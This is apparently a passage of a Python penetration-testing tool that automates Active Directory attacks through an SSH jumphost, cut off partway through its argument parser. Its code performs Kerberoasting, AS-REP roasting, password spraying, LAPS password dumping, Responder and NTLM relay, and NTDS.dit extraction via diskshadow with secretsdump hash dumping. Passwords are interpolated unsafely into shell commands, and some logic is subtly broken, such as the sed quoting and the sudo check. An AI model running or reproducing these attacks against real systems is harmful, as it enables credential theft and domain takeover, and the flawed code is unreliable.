#!/usr/bin/env python3
"""
Lazy-Tool v2.0 - Automated Security Testing Tool

An improved version of the original lazy-tool with better architecture,
enhanced security practices, and additional AD security testing modules.
"""

import os
import sys
import subprocess
import argparse
import logging
import logging.handlers
import re
import ipaddress
import xml.etree.ElementTree as ET
import time
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Tuple
from enum import Enum

import yaml
import paramiko
from paramiko.config import SSHConfig


class LogLevel(Enum):
    DEBUG = "DEBUG"
    INFO = "INFO"
    WARNING = "WARNING"
    ERROR = "ERROR"


@dataclass
class SSHConnection:
    client: paramiko.SSHClient
    hostname: str
    connected_at: float = field(default_factory=time.time)
    

class SSHConnectionManager:
    """Manages SSH connections with caching and connection pooling."""
    
    def __init__(self, config_path: str = str(Path.home() / ".ssh/config")):
        self._connections: Dict[str, SSHConnection] = {}
        self._sftp_clients: Dict[str, paramiko.SFTPClient] = {}
        self._config_path = config_path
        self._ssh_config = self._load_ssh_config()
        
    def _load_ssh_config(self) -> SSHConfig:
        """Load and parse SSH config file."""
        ssh_config = SSHConfig()
        config_file = Path(self._ssh_config_path)
        if config_file.exists():
            with open(config_file, 'r') as f:
                ssh_config.parse(f)
        return ssh_config
    
    @property
    def _ssh_config_path(self) -> str:
        return self._config_path
    
    def connect(self, hostname: str, timeout: int = 30) -> paramiko.SSHClient:
        """Get or create an SSH connection to the hostname."""
        if hostname in self._connections:
            conn = self._connections[hostname]
            if time.time() - conn.connected_at < 3600:
                try:
                    conn.client.exec_command("echo 1")
                    return conn.client
                except:
                    pass
        
        cfg = self._ssh_config.lookup(hostname)
        
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        connect_kwargs = {
            'hostname': cfg.get('hostname', hostname),
            'port': int(cfg.get('port', 22)),
            'username': cfg.get('user'),
            'key_filename': cfg.get('identityfile', [None])[0] if cfg.get('identityfile') else None,
            'look_for_keys': False,
            'timeout': timeout,
            'banner_timeout': 30,
        }
        
        if 'proxyjump' in cfg:
            connect_kwargs['sock'] = paramiko.ProxyCommand(
                f"ssh -W {cfg.get('hostname', hostname)}:{int(cfg.get('port', 22))} {cfg['proxyjump']}"
            )
        
        client.connect(**connect_kwargs)
        self._connections[hostname] = SSHConnection(client=client, hostname=hostname)
        
        return client
    
    def exec_command(self, hostname: str, command: str, timeout: int = 60) -> Tuple[str, str]:
        """Execute a command on the remote host and return (stdout, stderr)."""
        client = self.connect(hostname)
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            stdout_data = stdout.read().decode().strip()
            stderr_data = stderr.read().decode().strip()
            return stdout_data, stderr_data
        except subprocess.TimeoutExpired:
            return "", f"Command timed out after {timeout} seconds"
        except Exception as e:
            return "", str(e)
    
    def get_sftp(self, hostname: str) -> paramiko.SFTPClient:
        """Get SFTP client for the hostname."""
        if hostname not in self._sftp_clients:
            client = self.connect(hostname)
            self._sftp_clients[hostname] = client.open_sftp()
        return self._sftp_clients[hostname]
    
    def download_file(self, hostname: str, remote_path: str, local_path: str) -> bool:
        """Download a file from remote host."""
        try:
            sftp = self.get_sftp(hostname)
            sftp.get(remote_path, local_path)
            return True
        except Exception as e:
            logging.error(f"Failed to download {remote_path}: {e}")
            return False
    
    def upload_file(self, hostname: str, local_path: str, remote_path: str) -> bool:
        """Upload a file to remote host."""
        try:
            sftp = self.get_sftp(hostname)
            sftp.put(local_path, remote_path)
            return True
        except Exception as e:
            logging.error(f"Failed to upload {local_path}: {e}")
            return False
    
    def close_all(self):
        """Close all open connections."""
        for conn in self._connections.values():
            try:
                conn.client.close()
            except:
                pass
        self._connections.clear()
        
        for sftp in self._sftp_clients.values():
            try:
                sftp.close()
            except:
                pass
        self._sftp_clients.clear()


class Color:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'
    
    @classmethod
    def reset(cls):
        return cls.END
    
    @classmethod
    def is_supported(cls) -> bool:
        return sys.stdout.isatty()


def color_text(text: str, color: str) -> str:
    """Return colored text if output is a terminal, otherwise plain text."""
    return f"{color}{text}{Color.END}" if Color.is_supported() else text


def print_banner():
    """Print tool banner."""
    banner = f"""
{color_text('╔══════════════════════════════════════════════════════════╗', Color.BLUE)}
{color_text('║              Lazy-Tool v2.0 - Security Testing           ║', Color.BOLD)}
{color_text('║                                                          ║', Color.BLUE)}
{color_text('║  Automated AD Security Testing & Network Scanning        ║', Color.DIM)}
{color_text('╚══════════════════════════════════════════════════════════╝', Color.BLUE)}
"""
    print(banner)


def setup_logging(log_file: Optional[str] = None, level: str = "INFO") -> logging.Logger:
    """Configure logging with file rotation."""
    logger = logging.getLogger('lazy-tool')
    logger.setLevel(getattr(logging, level.upper()))
    
    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)
    logger.propagate = False
    
    if log_file:
        try:
            file_handler = logging.handlers.RotatingFileHandler(
                log_file, maxBytes=10*1024*1024, backupCount=5
            )
            file_handler.setFormatter(formatter)
            logger.addHandler(file_handler)
        except Exception as e:
            logger.warning(f"Could not create log file: {e}")
    
    return logger


def get_credential(name: str, default: Optional[str] = None) -> str:
    """Get credential from environment variable or prompt user."""
    env_map = {
        'password': 'LAZY_PASSWORD',
        'user': 'LAZY_USER',
        'domain': 'LAZY_DOMAIN',
        'dc_ip': 'LAZY_DC_IP',
    }
    
    env_var = env_map.get(name)
    if env_var and env_var in os.environ:
        return os.environ[env_var]
    
    value = os.environ.get(f"{name.upper()}")
    if value:
        return value
    
    return default if default else ""


def is_tool_installed(tool: str) -> bool:
    """Check if a tool is installed and available in PATH."""
    try:
        result = subprocess.run(
            ['which', tool], 
            stdout=subprocess.PIPE, 
            stderr=subprocess.DEVNULL,
            check=True
        )
        return result.returncode == 0
    except:
        return False


def check_dependencies(tools: List[str]) -> List[str]:
    """Check for required tools and return list of missing ones."""
    missing = []
    for tool in tools:
        if not is_tool_installed(tool):
            missing.append(tool)
    return missing


class ConfigValidator:
    """Validates YAML configuration files."""
    
    REQUIRED_HOST_FIELDS = ['name', 'scans']
    REQUIRED_SCAN_FIELDS = ['target']
    
    @classmethod
    def validate(cls, config: Dict[str, Any]) -> Tuple[bool, Optional[str]]:
        """Validate configuration and return (is_valid, error_message)."""
        if 'hosts' not in config:
            return False, "Configuration must contain 'hosts' section"
        
        for i, host in enumerate(config['hosts']):
            for field in cls.REQUIRED_HOST_FIELDS:
                if field not in host:
                    return False, f"Host {i} missing required field: {field}"
            
            if not host['scans']:
                return False, f"Host {host['name']} must have at least one scan"
            
            for scan in host['scans']:
                for field in cls.REQUIRED_SCAN_FIELDS:
                    if field not in scan:
                        return False, f"Scan missing required field: {field}"
        
        return True, None


def load_config(yaml_file: str) -> Dict[str, Any]:
    """Load and validate YAML configuration."""
    try:
        with open(yaml_file, 'r') as f:
            config = yaml.safe_load(f)
    except FileNotFoundError:
        sys.exit(f"Error: Config file {yaml_file} not found")
    except yaml.YAMLError as e:
        sys.exit(f"Error in YAML file: {e}")
    
    is_valid, error = ConfigValidator.validate(config)
    if not is_valid:
        sys.exit(f"Configuration error: {error}")
    
    return config


class NmapParser:
    """Parse nmap XML output files."""
    
    def __init__(self):
        self.results: Dict[str, List[Dict]] = {}
    
    def parse_file(self, path: str) -> None:
        """Parse a single nmap XML file."""
        try:
            tree = ET.parse(path)
            root = tree.getroot()
        except ET.ParseError:
            logging.error(f"Failed to parse XML file: {path}")
            return
        
        for host in root.findall('host'):
            address = host.find('address')
            if not address:
                continue
                
            ip = address.get('addr')
            
            if host.find('status').get('state') != 'up':
                continue
            
            ports = host.find('ports')
            if not ports:
                continue
                
            self.results[ip] = []
            
            for port in ports.findall('port'):
                state = port.find('state')
                if state is None:
                    continue
                    
                svc = port.find('service')
                
                port_info = {
                    'port': port.get('portid'),
                    'protocol': port.get('protocol'),
                    'state': state.get('state'),
                    'service': svc.get('name') if svc is not None else None,
                    'tunnel': svc.get('tunnel') if svc is not None else None,
                }
                self.results[ip].append(port_info)
    
    def parse_directory(self, path: str) -> None:
        """Parse all XML files in a directory."""
        path_obj = Path(path)
        
        if path_obj.is_file():
            self.parse_file(str(path_obj))
        elif path_obj.is_dir():
            for xml_file in path_obj.glob('*.xml'):
                self.parse_file(str(xml_file))
    
    def get_open_ports(self, ip: Optional[str] = None) -> List[Tuple[str, str]]:
        """Get list of (IP, port) tuples for open ports."""
        results = []
        targets = self.results.keys() if ip is None else [ip]
        
        for target_ip in targets:
            for port_info in self.results.get(target_ip, []):
                if port_info['state'] == 'open':
                    results.append((target_ip, port_info['port']))
        
        return results
    
    def get_web_ports(self) -> List[Tuple[str, str, str]]:
        """Get list of (IP, port, scheme) for potential web servers."""
        web_ports = []
        
        for ip, ports in self.results.items():
            for port_info in ports:
                if port_info['state'] != 'open':
                    continue
                
                port = port_info['port']
                
                if port in ['80', '443', '8080', '8443', '8000', '8888']:
                    scheme = 'https' if port_info['tunnel'] == 'ssl' else 'http'
                    web_ports.append((ip, port, scheme))
        
        return web_ports


class ADEnumerator:
    """Active Directory enumeration operations."""
    
    def __init__(self, ssh_manager: SSHConnectionManager, jumphost: str):
        self.ssh = ssh_manager
        self.jumphost = jumphost
    
    def check_tools(self) -> bool:
        """Verify required tools are installed."""
        tools = ['ldapsearch', 'netexec', 'nxc']
        missing = []
        
        for tool in tools:
            output, _ = self.ssh.exec_command(self.jumphost, f'command -v {tool}')
            if not output:
                missing.append(tool)
        
        if missing:
            logging.error(f"Missing tools: {', '.join(missing)}")
            return False
        return True
    
    def build_ldap_base(self, domain: str) -> str:
        """Build LDAP base DN from domain."""
        return ','.join(f'dc={part}' for part in domain.split('.'))
    
    def enumerate_enabled_users(
        self, 
        dc_ip: str, 
        user: str, 
        password: str, 
        domain: str
    ) -> Optional[str]:
        """Enumerate all enabled AD users."""
        if '@' not in user:
            user = f"{user}@{domain}"
        
        base_dn = self.build_ldap_base(domain)
        
        cmd = (
            f"ldapsearch -x -H ldap://{dc_ip} "
            f"-D '{user}' -w '{password}' "
            f"-E pr=1000/noprompt "
            f"-b '{base_dn}' "
            f"'(&(objectCategory=person)(objectClass=user)"
            f"(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' "
            f"sAMAccountName | grep '^sAMAccountName:' | cut -d':' -f2 | cut -d' ' -f2"
        )
        
        output, error = self.ssh.exec_command(self.jumphost, cmd)
        
        if error:
            logging.error(f"User enumeration failed: {error}")
            return None
        
        return output
    
    def enumerate_privileged_users(
        self,
        dc_ip: str,
        user: str,
        password: str,
        domain: str
    ) -> Optional[str]:
        """Find users in privileged AD groups."""
        if '@' not in user:
            user = f"{user}@{domain}"
        
        base_dn = self.build_ldap_base(domain)
        
        cmd = (
            f"ldapsearch -x -H ldap://{dc_ip} "
            f"-D '{user}' -w '{password}' "
            f"-E pr=1000/noprompt "
            f"-b '{base_dn}' "
            f"'(|"
            f"(memberOf=CN=Domain Admins,{base_dn})"
            f"(memberOf=CN=Enterprise Admins,CN=Users,{base_dn})"
            f"(memberOf=CN=Schema Admins,CN=Users,{base_dn})"
            f"(memberOf=CN=Administrators,CN=Builtin,{base_dn})"
            f")' "
            f"sAMAccountName memberOf | "
            f"grep -E '^sAMAccountName:' | "
            f"cut -d':' -f2 | cut -d' ' -f2"
        )
        
        output, _ = self.ssh.exec_command(self.jumphost, cmd)
        return output
    
    def get_user_descriptions(
        self,
        dc_ip: str,
        user: str,
        password: str,
        domain: str
    ) -> Optional[str]:
        """Get users with their descriptions."""
        if '@' not in user:
            user = f"{user}@{domain}"
        
        base_dn = self.build_ldap_base(domain)
        
        cmd = (
            f"ldapsearch -x -H ldap://{dc_ip} "
            f"-D '{user}' -w '{password}' "
            f"-E pr=1000/noprompt "
            f"-b '{base_dn}' "
            f"'(&(objectCategory=person)(objectClass=user)"
            f"(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' "
            f"sAMAccountName description | "
            f"awk 'BEGIN{{FS=\"\\n\";RS=\"\";OFS=\",\"}}"
            f"{{user=\"\";desc=\"\";"
            f"for(i=1;i<=NF;i++){{"
            f"if($i~/^sAMAccountName:/)user=substr($i,17);"
            f"if($i~/^description:/)desc=substr($i,13);}}print user,desc}}'"
        )
        
        output, _ = self.ssh.exec_command(self.jumphost, cmd)
        return output


class Kerberoaster:
    """Kerberoasting and ASREPRoasting operations."""
    
    def __init__(self, ssh_manager: SSHConnectionManager, jumphost: str):
        self.ssh = ssh_manager
        self.jumphost = jumphost
    
    def check_tool(self) -> bool:
        """Check if netexec is installed."""
        output, _ = self.ssh.exec_command(self.jumphost, 'command -v netexec')
        if not output:
            logging.error("netexec not installed on jumphost")
            return False
        return True
    
    def kerberoast(
        self,
        dc_ip: str,
        user: str,
        password: str,
        domain: str
    ) -> Tuple[bool, str]:
        """Perform Kerberoasting attack."""
        if '@' in user:
            user = user.split('@')[0]
        
        cmd = (
            f"netexec ldap {dc_ip} "
            f"-u '{user}' -p '{password}' "
            f"-d {domain} --kdcHost {dc_ip} "
            f"--kerberoasting /tmp/kerberoasted"
        )
        
        output, error = self.ssh.exec_command(self.jumphost, cmd)
        
        if error:
            return False, error
        
        return True, output
    
    def asreproast(
        self,
        dc_ip: str,
        user: str,
        password: str,
        domain: str
    ) -> Tuple[bool, str]:
        """Perform ASREPRoasting attack."""
        if '@' in user:
            user = user.split('@')[0]
        
        cmd = (
            f"netexec ldap {dc_ip} "
            f"-u '{user}' -p '{password}' "
            f"-d {domain} --kdcHost {dc_ip} "
            f"--asreproast /tmp/asreproasted"
        )
        
        output, error = self.ssh.exec_command(self.jumphost, cmd)
        
        if error:
            return False, error
        
        return True, output


class PasswordSprayer:
    """Password spraying attacks against AD."""
    
    def __init__(self, ssh_manager: SSHConnectionManager, jumphost: str):
        self.ssh = ssh_manager
        self.jumphost = jumphost
    
    def spray(
        self,
        dc_ip: str,
        password: str,
        domain: str,
        user_list: str,
        target: Optional[str] = None
    ) -> Tuple[bool, str]:
        """
        Spray a single password against a list of users.
        
        Args:
            dc_ip: Domain controller IP
            password: Password to spray
            domain: AD domain
            user_list: Path to file with usernames (one per line)
            target: Optional target (smb, ldap, ssh, etc.)
        """
        if not target:
            target = "smb"
        
        cmd = (
            f"netexec smb {dc_ip} "
            f"-u {user_list} "
            f"-p '{password}' "
            f"-d {domain}"
        )
        
        output, error = self.ssh.exec_command(self.jumphost, cmd, timeout=300)
        
        if error:
            return False, error
        
        return True, output


class LAPSEnumerator:
    """LAPS (Local Administrator Password Solution) enumeration."""
    
    def __init__(self, ssh_manager: SSHConnectionManager, jumphost: str):
        self.ssh = ssh_manager
        self.jumphost = jumphost
    
    def enumerate_laps(
        self,
        dc_ip: str,
        user: str,
        password: str,
        domain: str
    ) -> Tuple[bool, str]:
        """Enumerate computers with LAPS passwords."""
        if '@' in user:
            user = user.split('@')[0]
        
        print("[*] Enumerating domain computers...", flush=True)
        cmd = (
            f"netexec ldap {dc_ip} "
            f"-u '{user}' -p '{password}' "
            f"-d {domain} --kdcHost {dc_ip} "
            f"--computers | awk '{{print $1}}'"
        )
        
        _, _ = self.ssh.exec_command(self.jumphost, cmd, timeout=60)
        
        cmd2 = (
            f"netexec ldap {dc_ip} "
            f"-u '{user}' -p '{password}' "
            f"-d {domain} --kdcHost {dc_ip} "
            f"--computers -o /tmp/computers.txt"
        )
        output, _ = self.ssh.exec_command(self.jumphost, cmd2, timeout=120)
        
        print("[*] Querying LAPS passwords from computers...", flush=True)
        cmd3 = (
            f"netexec smb /tmp/computers.txt "
            f"-u '{user}' -p '{password}' "
            f"-d {domain} --laps"
        )
        
        output, error = self.ssh.exec_command(self.jumphost, cmd3, timeout=300)
        
        if error and not output:
            return False, error
        
        return True, output


class BloodHoundCollector:
    """BloodHound data collection using netexec."""
    
    def __init__(self, ssh_manager: SSHConnectionManager, jumphost: str):
        self.ssh = ssh_manager
        self.jumphost = jumphost
    
    def check_tool(self) -> bool:
        """Check if netexec is installed."""
        output, _ = self.ssh.exec_command(self.jumphost, 'command -v netexec')
        return bool(output)
    
    def collect(
        self,
        dc_ip: str,
        user: str,
        password: str,
        domain: str
    ) -> Tuple[bool, str]:
        """Collect BloodHound data using netexec ldap module."""
        if '@' in user:
            user = user.split('@')[0]
        
        cmd = (
            f"netexec ldap {dc_ip} "
            f"-u '{user}' "
            f"-p '{password}' "
            f"-d {domain} "
            f"--dns-server {dc_ip} "
            f"--bloodhound "
            f"-c All"
        )
        
        output, error = self.ssh.exec_command(self.jumphost, cmd, timeout=600)
        
        if error and not output:
            return False, error
        
        find_zip = f"ls -t /home/kali/.nxc/logs/*bloodhound*.zip 2>/dev/null | head -1"
        zip_path, _ = self.ssh.exec_command(self.jumphost, find_zip)
        
        return True, zip_path.strip() if zip_path else ""


class ResponderController:
    """Manage Responder and NTLM relay attacks."""
    
    def __init__(self, ssh_manager: SSHConnectionManager, jumphost: str):
        self.ssh = ssh_manager
        self.jumphost = jumphost
    
    def check_tools(self) -> List[str]:
        """Check for required tools."""
        required = ['tmux', 'responder']
        missing = []
        
        for tool in required:
            output, _ = self.ssh.exec_command(self.jumphost, f'command -v {tool}')
            if not output:
                missing.append(tool)
        
        return missing
    
    def get_active_interface(self) -> Optional[str]:
        """Get an active network interface for Responder."""
        output, _ = self.ssh.exec_command(self.jumphost, 'ip -br a')
        
        interfaces = []
        for line in output.split('\n'):
            match = re.match(r'^(\S+)\s+.*UP.*(\d+\.\d+\.\d+\.\d+)', line)
            if match:
                iface = match.group(1)
                if not iface.startswith(('lo', 'docker', 'br-', 'veth', 'tun')):
                    interfaces.append(iface)
        
        return interfaces[0] if interfaces else None
    
    def start_responder(self, interface: str, enable_smb: bool = False) -> bool:
        """Start Responder on specified interface."""
        if not enable_smb:
            cmd = (
                "sudo sed -i '/^SMB[[:space:]]*=/ s/On/Off/; "
                "'/^HTTP[[:space:]]*=/ s/On/Off/' /etc/responder/Responder.conf"
            )
            self.ssh.exec_command(self.jumphost, cmd)
        
        cmd = f"tmux new-session -d -s responder 'sudo responder -Pv -I {interface}'"
        output, error = self.ssh.exec_command(self.jumphost, cmd)
        
        if error:
            logging.error(f"Failed to start Responder: {error}")
            return False
        
        logging.info(f"Responder started on {interface}")
        return True
    
    def start_ntlmrelayx(
        self,
        target_list: str,
        socks: bool = False
    ) -> bool:
        """Start ntlmrelayx with target list."""
        cmd = "impacket-ntlmrelayx"
        
        if socks:
            cmd += " -socks"
        
        cmd += f" -tf {target_list} -smb2support"
        
        full_cmd = f"tmux new-session -d -s ntlmrelayx '{cmd}'"
        output, error = self.ssh.exec_command(self.jumphost, full_cmd)
        
        if error:
            logging.error(f"Failed to start ntlmrelayx: {error}")
            return False
        
        logging.info("ntlmrelayx started")
        return True
    
    def check_smb_signing(self, target_list: str) -> Optional[str]:
        """Find hosts with SMB signing disabled."""
        cmd = f"netexec smb {target_list} --gen-relay-list /tmp/no-smb-signing.txt"
        output, error = self.ssh.exec_command(self.jumphost, cmd, timeout=300)
        
        if error:
            return None
        
        return "/tmp/no-smb-signing.txt"


class NTDSAuditor:
    """NTDS.dit extraction and auditing."""
    
    def __init__(self, ssh_manager: SSHConnectionManager, jumphost: str):
        self.ssh = ssh_manager
        self.jumphost = jumphost
        self.ssh_manager = ssh_manager
    
    def extract_ntds(
        self,
        dc_ip: str,
        user: str,
        password: str,
        domain: str
    ) -> Tuple[bool, str]:
        """
        Extract NTDS.dit using VSS method via diskshadow.
        Returns: (success, message)
        """
        if '@' in user:
            user = user.split('@')[0]
        
        diskshadow_script = '''
set context persistent nowriters
set metadata C:\\Windows\\Temp\\meta.cab
set verbose on
add volume c: alias temp
create
expose %temp% z:
exec "C:\\Windows\\Temp\\cop.cmd"
delete shadows volume %temp%
reset
'''
        
        cop_cmd = '''
copy z:\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit
copy z:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\copy-system.hive
'''
        
        script_content = '''$s = @"
{ds_script}
"@ -replace "`n", "`r`n"
$s | Out-File C:\\Windows\\Temp\\ds.txt -Encoding ASCII

$cop = @"
{cp_cmd}
"@ -replace "`n", "`r`n"
$cop | Out-File C:\\Windows\\Temp\\cop.cmd -Encoding ASCII

diskshadow.exe /s C:\\Windows\\Temp\\ds.txt
'''.format(ds_script=diskshadow_script, cp_cmd=cop_cmd)
        
        script_path = Path(r"/tmp/audit.ps1")
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        self.ssh.upload_file(self.jumphost, str(script_path), "/tmp/audit.ps1")
        
        upload_cmd = (
            f"smbclient //{dc_ip}/C$ "
            f"-U '{domain}/{user}' --password='{password}' "
            f"-c 'put /tmp/audit.ps1 Windows/Temp/audit.ps1'"
        )
        _, error = self.ssh.exec_command(self.jumphost, upload_cmd)
        
        if 'NT_STATUS' in error or 'failed' in error.lower():
            return False, f"Failed to upload script: {error}"
        
        execute_cmd = f"nxc winrm {dc_ip} -u '{user}' -p '{password}' -X 'C:\\Windows\\Temp\\audit.ps1'"
        _, error = self.ssh.exec_command(self.jumphost, execute_cmd, timeout=120)
        
        if error:
            logging.warning(f"Script execution warnings: {error}")
        
        local_dir = Path("ntds")
        local_dir.mkdir(exist_ok=True)
        
        print("[*] Downloading ntds.dit from DC...", flush=True)
        get_ntds = (
            f"smbclient //{dc_ip}/C$ "
            f"-U '{domain}/{user}' --password='{password}' "
            f"-c 'get Windows\\\\Temp\\\\ntds.dit /tmp/ntds.dit'"
        )
        self.ssh.exec_command(self.jumphost, get_ntds)
        
        print("[*] Downloading SYSTEM hive from DC...", flush=True)
        get_system = (
            f"smbclient //{dc_ip}/C$ "
            f"-U '{domain}/{user}' --password='{password}' "
            f"-c 'get Windows\\\\Temp\\\\copy-system.hive /tmp/copy-system.hive'"
        )
        self.ssh.exec_command(self.jumphost, get_system)
        
        return True, "NTDS extraction complete"
    
    def dump_hashes_locally(self) -> bool:
        """Dump NTLM hashes using secretsdump from jumphost."""
        ntds_file = Path("ntds/ntds.dit")
        system_file = Path("ntds/copy-system.hive")
        
        if not ntds_file.exists() or not system_file.exists():
            logging.error("NTDS files not found")
            return False
        
        Path("ntlms").mkdir(exist_ok=True)
        
        print("[*] Uploading NTDS files to jumphost...", flush=True)
        self.ssh_manager.upload_file(self.jumphost, str(ntds_file), "/tmp/ntds.dit")
        self.ssh_manager.upload_file(self.jumphost, str(system_file), "/tmp/copy-system.hive")
        
        secretsdump_cmd = (
            "python3 /usr/share/doc/python3-impacket/examples/secretsdump.py "
            "-system /tmp/copy-system.hive "
            "-ntds /tmp/ntds.dit "
            "-just-dc-ntlm "
            "-history "
            "LOCAL "
            "-outputfile /tmp/ntlm-hashes"
        )
        
        print("[*] Dumping NTLM hashes on jumphost...", flush=True)
        output, error = self.ssh.exec_command(self.jumphost, secretsdump_cmd, timeout=300)
        
        if output and 'error' not in output.lower():
            self.ssh_manager.download_file(self.jumphost, "/tmp/ntlm-hashes.ntds", "ntlms/ntlm-hashes.ntds")
            print("[+] Hashes dumped successfully", flush=True)
            return True
        
        logging.error(f"Hash dump failed: {error or output}")
        return False


class NetworkScanner:
    """Network scanning operations via jumphosts."""
    
    def __init__(self, ssh_manager: SSHConnectionManager, jumphost: str):
        self.ssh = ssh_manager
        self.jumphost = jumphost
    
    def check_requirements(self) -> List[str]:
        """Check for required tools and permissions."""
        missing = []
        
        for tool in ['nmap', 'tmux']:
            output, _ = self.ssh.exec_command(self.jumphost, f'command -v {tool}')
            if not output:
                missing.append(tool)
        
        sudo_check, _ = self.ssh.exec_command(self.jumphost, 'sudo -n true')
        if sudo_check:
            missing.append('sudo_nopasswd')
        
        return missing
    
    def get_interfaces(self) -> Dict[str, str]:
        """Get network interfaces and their IPs."""
        output, _ = self.ssh.exec_command(self.jumphost, 'ip -br a')
        
        interfaces = {}
        for line in output.split('\n'):
            parts = line.split()
            if len(parts) >= 2:
                iface = parts[0]
                for part in parts[1:]:
                    if '.' in part and '/' in part:
                        ip = part.split('/')[0]
                        interfaces[iface] = ip
                        break
        
        return interfaces
    
    def discover_live_hosts(
        self,
        interface: str,
        network: str
    ) -> List[str]:
        """Discover live hosts using arp-scan."""
        awk_cmd = r"awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}'"
        
        cmd = f"sudo arp-scan -I {interface} {network} | {awk_cmd}"
        output, _ = self.ssh.exec_command(self.jumphost, cmd, timeout=300)
        
        return [ip.strip() for ip in output.split('\n') if ip.strip()]
    
    def run_nmap_scan(
        self,
        target: str,
        interface: Optional[str] = None,
        tcp_args: str = "-sS --min-rate=200 -p- -T4",
        udp_args: str = "-sU -sV --min-rate=1000",
        output_prefix: str = "scan"
    ) -> Dict[str, str]:
        """Run nmap scan from jumphost."""
        base_dir = "lazy-tool/scans"
        self.ssh.exec_command(self.jumphost, f"mkdir -p {base_dir}")
        
        results = {}
        
        if interface:
            tcp_cmd = f"sudo nmap -e {interface} {tcp_args} -oA {base_dir}/{output_prefix}.tcp {target}"
            udp_cmd = f"sudo nmap -e {interface} {udp_args} -oA {base_dir}/{output_prefix}.udp {target}"
        else:
            tcp_cmd = f"sudo nmap {tcp_args} -oA {base_dir}/{output_prefix}.tcp {target}"
            udp_cmd = f"sudo nmap {udp_args} -oA {base_dir}/{output_prefix}.udp {target}"
        
        tcp_out, tcp_err = self.ssh.exec_command(self.jumphost, tcp_cmd, timeout=600)
        results['tcp'] = tcp_out
        
        udp_out, udp_err = self.ssh.exec_command(self.jumphost, udp_cmd, timeout=600)
        results['udp'] = udp_out
        
        return results
    
    def start_parallel_scans(
        self,
        scan_file: str,
        parallel: int = 2
    ) -> bool:
        """Start multiple nmap scans in parallel using tmux."""
        remote_dir = "lazy-tool/scans"
        self.ssh.exec_command(self.jumphost, f"mkdir -p {remote_dir}")
        
        remote_file = f"{remote_dir}/scan_commands.txt"
        self.ssh.exec_command(self.jumphost, f"echo '{scan_file}' > {remote_file}")
        
        xargs_cmd = f"cat {remote_file} | xargs -P {parallel} -I {{}} sh -c '{{}}'"
        tmux_cmd = f"tmux new-session -d -s nmap-scans '{xargs_cmd}'"
        
        _, error = self.ssh.exec_command(self.jumphost, tmux_cmd)
        
        if error:
            logging.error(f"Failed to start scans: {error}")
            return False
        
        return True


class SecurityTestGenerator:
    """Generate security testing commands from scan results."""
    
    def __init__(self, nmap_parser: NmapParser):
        self.parser = nmap_parser
    
    def generate_web_commands(self) -> Dict[str, List[str]]:
        """Generate web security testing commands."""
        commands = {
            'nuclei': [],
            'gobuster': [],
            'nikto': [],
            'testssl': [],
            'ssh_audit': [],
        }
        
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        
        for ip, port, scheme in self.parser.get_web_ports():
            url = f"{scheme}://{ip}:{port}"
            
            commands['nuclei'].append(f"nuclei -u {url}")
            commands['gobuster'].append(
                f"gobuster dir -k -u {url} -w {wordlist}"
            )
            commands['nikto'].append(f"nikto -h {url}")
            
            if scheme == 'https':
                commands['testssl'].append(f"testssl --jsonfile testssl/{ip}-{port}.json {ip}:{port}")
        
        return commands
    
    def generate_ssh_commands(self) -> List[str]:
        """Generate SSH auditing commands."""
        commands = []
        
        for ip, port in self.parser.get_open_ports():
            for port_info in self.parser.results.get(ip, []):
                if 'ssh' in str(port_info.get('service', '')):
                    commands.append(f"ssh-audit {ip}:{port}")
        
        return commands
    
    def generate_script(self, output_dir: str = "generated-tests") -> str:
        """Generate a complete bash script with all security tests."""
        os.makedirs(output_dir, exist_ok=True)
        
        script_lines = ["#!/bin/bash", "", "# Auto-generated security test script", ""]
        
        web_cmds = self.generate_web_commands()
        
        for tool, cmds in web_cmds.items():
            if cmds:
                script_lines.append(f"# {tool.upper()} commands")
                for cmd in cmds:
                    script_lines.append(cmd)
                script_lines.append("")
        
        ssh_cmds = self.generate_ssh_commands()
        if ssh_cmds:
            script_lines.append("# SSH Audit commands")
            for cmd in ssh_cmds:
                script_lines.append(cmd)
            script_lines.append("")
        
        script_path = Path(output_dir) / "run_all_tests.sh"
        with open(script_path, 'w') as f:
            f.write('\n'.join(script_lines))
        
        os.chmod(script_path, 0o755)
        
        return str(script_path)


def create_argument_parser() -> argparse.ArgumentParser:
    """Create the main argument parser with all subcommands."""
    parser = argparse.ArgumentParser(
        description="Lazy-Tool v2.0 - Automated Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )
    parser.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Suppress non-essential output"
    )
    parser.add_argument(
        "--log",
        help="Log file path"
    )
    
    subparsers = parser.add_subparsers(dest="mode", required=True, help="Select operation mode")
    
    network_parser = subparsers.add_parser(
        "network-scan",
        help="Run network scans from jumphost"
    )
    network_parser.add_argument("config", help="YAML configuration file")
    network_parser.add_argument("--live", action="store_true", help="Scan only live hosts")
    network_parser.add_argument("--dry-run", action="store_true", help="Print commands without executing")
    
    users_parser = subparsers.add_parser(
        "users",
        help="Enumerate AD users"
    )
    users_parser.add_argument("-jh", "--jumphost", required=True, help="SSH jumphost")
    users_parser.add_argument("-dc", "--dc-ip", required=True, help="Domain controller IP")
    users_parser.add_argument("-u", "--user", required=True, help="AD username")
    users_parser.add_argument("-p", "--password", help="Password (or use LAZY_PASSWORD env)")
    users_parser.add_argument("-d", "--domain", required=True, help="AD domain")
